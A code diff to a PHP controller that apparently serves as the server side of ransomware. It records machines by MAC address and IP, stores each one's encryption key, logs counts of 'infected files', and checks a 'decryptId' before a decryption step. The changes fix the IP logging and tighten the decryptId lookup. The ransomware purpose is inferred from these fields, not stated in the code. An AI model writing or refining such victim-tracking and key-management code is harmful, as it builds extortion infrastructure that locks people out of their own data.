@@ -31,10 +31,9 @@ class UserController extends BaseController
             $macAdress = $data['macAdress'];
 
             $encryptionKey = $data['encryptionKey'];
-            $decryptId = $data['decryptId'];
 
             $user = $this->userRepository->findOneBy(['macAddress' => $macAdress]) ?? new User();
-            if(array_key_exists('ip', $data)) $user->setIp($data['ip']);
+            $user->setIp($data['ip']);
 
             $uuid = Uuid::v4();
 
@@ -50,7 +49,7 @@ class UserController extends BaseController
             $this->userRepository->save($user, true);
 
             $log = (new Log)
-                ->setIp($macAdress);
+                ->setIp($data['ip']);
 
             if(array_key_exists('infectedFiles', $data)) $log->setNumberInfectedFile($data['infectedFiles']);
 
@@ -69,10 +68,15 @@ class UserController extends BaseController
     {
         try {
             $data = json_decode($request->getContent(), true);
-            if($data['decryptId']) {
-                $user = $this->userRepository->findOneBy(['decryptId' => $data['decryptId']]);
-            } else {
-                throw $this->createAccessDeniedException();
+
+            if(!array_key_exists('decryptId', $data)) {
+                throw $this->createAccessDeniedException('Invalid decrypt Id');
+            }
+
+            $user = $this->userRepository->findOneBy(['decryptId' => $data['decryptId']]);
+
+            if(!$user) {
+                throw $this->createAccessDeniedException('Invalid decrypt Id');
             }
 
             if($data['email']) {
